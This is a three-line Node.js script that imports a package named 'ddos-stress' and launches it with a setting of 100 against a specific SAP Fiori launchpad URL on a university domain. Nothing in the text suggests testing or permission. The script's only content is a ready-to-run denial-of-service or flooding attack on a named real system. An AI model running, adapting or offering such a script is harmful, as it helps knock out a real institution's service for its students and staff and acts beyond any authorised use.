const Stress = require('ddos-stress');


const stress=new Stress();


stress.run('https://fiori.riphah.edu.pk:8011/sap/bc/ui2/flp#Shell-home',100);